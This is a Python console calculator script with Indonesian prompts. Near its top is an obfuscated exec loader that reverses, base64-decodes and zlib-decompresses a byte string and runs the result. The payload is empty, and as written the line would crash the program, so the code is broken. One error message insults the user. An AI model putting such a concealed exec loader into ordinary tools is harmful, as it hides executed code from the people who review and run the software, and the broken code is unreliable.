RED = "\u001B[31m"
GREEN = "\u001B[32m"
BLUE = "\u001B[34m"
DEFAULT = "\u001B[0m"

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b''))

print(f"\nHint : Ketik '{BLUE}lumi{DEFAULT}' untuk berhenti.")

while True:
    operator = input(f"\nMasukkan operator ({BLUE}+, -, *, /{DEFAULT}) : ").strip()
    
    if operator.lower() == 'lumi':
        print(GREEN + "\nLumilator berhenti! Terima kasih." + DEFAULT)
        break
    
    if operator not in ['+', '-', '*', '/']:
        print(RED + "\nERROR : Operatornya nggak valid bro, pakai +, -, *, atau /" + DEFAULT)
        continue
    
    try:
        angka1 = float(input("Angka Pertama : "))
        angka2 = float(input("Angka Kedua : "))
    except ValueError:
        print(RED + "\nERROR : Eh tolol lu kalo ngetik yang bener." + DEFAULT)
        continue
    
    if operator == '/' and angka2 == 0:
        print(RED + "\nERROR : Nggak bisa membagi dengan nol!" + DEFAULT)
        continue

    if operator == '+':
        hasil = angka1 + angka2
    elif operator == '-':
        hasil = angka1 - angka2
    elif operator == '*':
        hasil = angka1 * angka2
    elif operator == '/':
        hasil = angka1 / angka2

    print(f"\n{GREEN}HASIL : {BLUE}{angka1} {operator} {angka2} = {hasil:.2f}{DEFAULT}")